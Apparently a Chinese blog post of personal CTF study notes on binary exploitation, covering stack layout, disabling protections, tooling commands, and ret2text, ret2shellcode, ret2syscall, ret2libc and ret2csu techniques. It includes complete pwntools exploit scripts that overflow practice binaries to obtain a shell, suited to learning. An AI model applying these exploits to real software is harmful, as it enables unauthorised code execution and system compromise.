---
title: pwn学习
date: 2021-09-06 23:45:55
tags:	
	- pwn


---

<!--more-->

这是我近期对pwn学习的一部分整理，包含一些概念和命令，加油~

# PWN理论基础

## **溢出概念**

计算机中，当要表示的数据超过计算机所使用的数据的表示范围时，则产生数据的溢出。（在汇编中OF表示溢出标志位）

## **原因**

1.使用非类型安全（non-type-safe）的语言如C/C++等。

2.以不可靠的方式存取或者复制内存缓冲区。

3.编译器设置的内存缓冲区太靠近关键数据结构。

## 寄存器复习

**（32位）PWN常用寄存器，ESP、EBP、EIP**

ESP:用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化

EBP:用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或者局部变量的位置

EIP:用来存储即将执行的程序指令的地址

![image-20210621172155894](https://s2.loli.net/2022/03/26/kgZaumCKWtP692X.png)

## **指令**

lea——取地址指令，将MEM的地址存至REG，格式为：LEA REG,MEM；

leave——

等价于

mov esp，ebp

pop ebp 

## 栈帧

![image-20210621173017129](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20210621173017129.png)

## 编译C

![image-20210621182215890](https://s2.loli.net/2022/03/26/VmovqW8bGRtQI2C.png)

**-m32代表编译32位程序，不然可能是64位程序了，-o代表编译。**

## 关闭保护

```
gcc -no-pie -fno-stack-protector -z execstack -m32 -o read read.c
```

![image-20210621194437750](https://s2.loli.net/2022/03/26/IX9R6mx7S8dvCtV.png)

编译的时候加参数：

```
-no-pie表示不加地址空间随机化
-fno-stack-protector把栈保护关了，完全不执行
-z execstack 栈数据可执行
-m32 32位程序

```

## p32 and u32

前者将数字转化为字符串,后者反之

## objdump

objdump时查看目标文件或可执行文件的gcc工具。

```
-j name 仅仅显示指定名称为name的section的信息
-t 显示文件的符号表入口
objdump -t -j .text read 查看read 程序的.text段有哪些函数
objdump -d -j .plt ./xxx | grep system 查看xxx文件是否还有plt表system函数
```

**objdump -t -j .text read**

![image-20210621201012174](https://s2.loli.net/2022/03/26/4i3mcwXlAvRSnFs.png)

## Canary保护

![image-20220326111453864](https://s2.loli.net/2022/03/26/ZNce8sb9EhkY3AU.png)

### 启动堆栈保护1

```
gcc -no-pie -fstack-protector-all -m32 -o test1 test1.c
```

启动堆栈保护，为所有函数插入保护代码。

### 启动堆栈保护2

```
gcc -no-pie -fstack-protector -m32 -o test1 test1.c
```

启动堆栈保护，不过只为局部变量中含有char数组的函数插入保护代码。

## GDB使用

```
https://bbs.pediy.com/thread-250772.htm
```

[](https://bbs.pediy.com/thread-250772.htm)

## GDB查看命令

```
x/s offset 查看offset位置的字符串
x/12i offset 查看从offset开始的12行汇编
x/wx offset 查看offset处的数据
```

## pwndbg与peda切换

```
vim ~/.gdbinit
```



## pwntools几个命令

```
interactive() 在去得shell之后使用，直接进行交互，相当于回到shell的模式。
recv(numb=字节大小，timeout=default) 接收指定字节数
recvall() 一直接收直到达到文件EOF
recvline(keepends=TRUE) 接收一行，keepends为是否保留行尾的\n
recvuntil(delims，drops=False) 一直读到delims的pattern出现为止
recvrepeat(timeout=default) 持续接受直到EOF或timeout
```



## printf 格式化字符串漏洞

![image-20220326111527176](https://s2.loli.net/2022/03/26/CVfKkjHWzgouMxX.png)

```
fprintf()  printf() sprintf() dprintf()…… 
```

### 条件

格式字符串的所要求参数和实际提供参数不匹配时，就会输出栈里的其他数据。

## ROP—Ret2Text介绍

BSS段通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS段属于静态内存分配。（在溢出时EIP的值可以是BSS段的地址）

DATA通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。Text通常是指用来存放程序执行代码的一块内存区域。称为代码段。

rodata段存放C中的字符串和#define定义的常量。

### ret2text

https://gitee.com/Rudesa/image/raw/master/img/20210624104034.png

![image-20210624145024333](https://s2.loli.net/2022/03/26/FyELqWcdzbepVmJ.png)

![image-20210624145011463](https://s2.loli.net/2022/03/26/TVezthCF4cfJZXE.png)

### cyclic 命令

```
cyclic 200  	创建两百个随机字符串
```

```
cyclic -l address 查看address的偏移
```

 

### 找system函数

```
objdump -t xxx 查看程序中使用到的函数
objdump -d xxx 查看程序中函数的汇编代码
```

```
objdump -d -j .plt xxx 查看plt表
	-j的参数有： .text	-代码段
				.const -只读数据段（有些编译器不使用此段，将只读并入.data段）、
				.data  -读写数据段
				.bss   -bss段
objdump -d -M intel xxx 查看程序中的函数的汇编代码，并且汇编代码是intel架构的
objdump -d -M intel xxx | grep system 查找程序中的system函数地址
```

### 计算偏移

```
pattern create 200 创建200个随机数
pattern offset AAAA 查找AAAA的偏移
```

## Ret2Shellcode

题目如果找不到system函数，就用ret2shellcode做，一般没有NX保护shellcode都可以用

![image-20211018175401191](https://s2.loli.net/2022/03/26/og3YeFVjcPmr6Jp.png)

### shellcode

```
shellcode是黑客编写的用于实行特定功能的汇编代码，通常开启一个shell
```

### shellcode获取的两种方法

![image-20211018180920213](https://s2.loli.net/2022/03/26/XI7MCqTSVDQZFPU.png)

```
1.手写
①想办法调用execve("/bin/sh",null,null);
②传入字符串/bin///sh
③系统调用execve
eax=11
ebx=bin_sh_addr(参数一)
ecx=0(参数二)
edx=0(参数三)
```

![image-20211018182437069](https://s2.loli.net/2022/03/26/wp8QPWLnC7beU3Z.png)

**shellcode长度不够就使用pwntools的函数shellcode.ljust(112,'A')指定112长度，不够用A填充**

```
2.pwntools自动生成
①先指定context,arch="i386/amd64"
②asm(自定义shellcode)
③asm(shellcraft.sh())
④自动生成shellcode

```

![image-20211018190611755](https://s2.loli.net/2022/03/26/RJNMY2SQB916jqK.png)

32位如上：

![image-20211018215507887](https://s2.loli.net/2022/03/26/7agXwUm8CxFdlkG.png)

64位如上



## 深入理解NX保护

```
NX（又称DEP）数据执行保护：可写的不可执行，可执行的不可写
```

## context架构

```
64位：
context(arch="amd64",os="Linux",log_level="debug")
32位：
context(arch="i386",os="Linux",log_level="debug")
```

### vmmap

```
查看读写修改权力，配合shellcode使用
```

## 利用rop-Ret2syscall突破NX保护-如何拼凑shellcode

![image-20211020210624637](https://s2.loli.net/2022/03/26/t7plzxVv6hTeaAX.png)

## ROPgadget

```
ROPgadget --binary xxx --only "pop|ret" | grep "rdi"查找含有pop|ret的rdi位置

ROPgadget --binary xxx --only "pop|ret" |grep "ebx" | grep "ecx" |grep "edx"查找含有pop|ret并且edx、ecx、edx三个寄存器连一块的地址

ROPgadget --binary xxx  --string '/bin/sh' 查找/bin/sh位置

ROPgadget --binary xxx --only "int" |grep 0x80 寻找0x80d
```

### ROP-Ret2Libc

Libc就是Linux下的C函数库，libc中包含着各种常用的函数，在程序执行时才被加载到内存中，libc一定可执行，跳转到libc中函数绕过NX保护

Libc函数地址要是开启ASLR就找不到了……

![image-20211021184510150](https://s2.loli.net/2022/03/26/oZ4F9PagqzV2HeR.png)

![image-20211021182827672](https://s2.loli.net/2022/03/26/ypWHQKoclbCfsIu.png)

```
ldd xxx     查看xxx文件适应的libc库
```

32位调用方式

![image-20211111191330405](https://s2.loli.net/2022/03/26/1FPNBpalkObW68G.png)

64位

![image-20211111192336483](https://s2.loli.net/2022/03/26/E9BduS7ZxHcvXaC.png)

# 基本rop

## ret2text

ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

**例子：**

https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text

**泄露libc函数地址的条件**：

```
程序有输出函数：例如puts/printf/write
实现：设置好参数为某函数GOT表地址
（GOT表保存已调用过的函数的真实地址）
例如：puts_plt(puts_got)
栈缓冲区溢出的基础上，寻找以ret结尾的代码片段
如何实现：设置参数、持续控制的目的
构造执行write(1,buf2,20)，之后在返回main函数
```

![image-20211021183619142](https://s2.loli.net/2022/03/26/uIQi8La6elRKdTc.png)

## ret2shellcode



ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码**。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

**例子：**

https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode

## ret2syscall

**原理** 

ret2syscall，即控制程序执行系统调用，获取 shell。

**例子**

https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop

此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。

其中，该程序是 32 位，所以我们需要使得

- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 **ropgadgets** 这个工具。

## ret2libc

**例子1**

https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1

直接查找/bin/sh和system,直接溢出

```
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()

```

**例子2**

https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2

该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个  gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的  exp 如下

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

```

**例子3**



https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3



- 泄露 __libc_start_main 地址

- 获取 libc 版本

- 获取 system 地址与 /bin/sh 的地址

- 再次执行源程序

- 触发栈溢出执行 system(‘/bin/sh’)

  ```
  from pwn import *
  sh = process('./ret2libc3')
  
  ret2libc3 = ELF('./ret2libc3')
  
  puts_plt = ret2libc3.plt['puts']
  libc_start_main_got = ret2libc3.got['__libc_start_main']
  main = ret2libc3.symbols['main']
  
  print "leak libc_start_main_got addr and return to main again"
  payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
  sh.sendlineafter('Can you find it !?', payload)
  
  print "get the related addr"
  libc_start_main_addr = u32(sh.recv()[0:4])
  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
  libcbase = libc_start_main_addr - libc.sym['__libc_start_main']
  system_addr = libcbase + libc.symbols['system']
  binsh_addr = libcbase + libc.search("/bin/sh").next()
  
  print "get shell"
  payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
  sh.sendline(payload)
  
  sh.interactive()
  PS：先ldd xxx 一下查看libc版本
  ```

  

#  中级ROP

## ret2csu

### 原理 [¶](https://wiki.x10sec.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1)

在64位程序中，函数的前6各参数是通过寄存器传递的，可以看到rdi作为第一个参数，rsi作为第二个参数，rdx作为第三个参数，rcx作为第四个参数，r8作为第五个参数，r9作为第六个参数。也就是说在函数调用参数的时候会依次在六个寄存器中寻找，如果参数多余6个，那么就需要在栈中寻找，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用  libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)




基本利用思路如下

- 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
- 根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
- 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。
- 再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。

例子：

https://github.com/zhengmin1989/ROP_STEP_BY_STEP/

EXP：

```
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

```

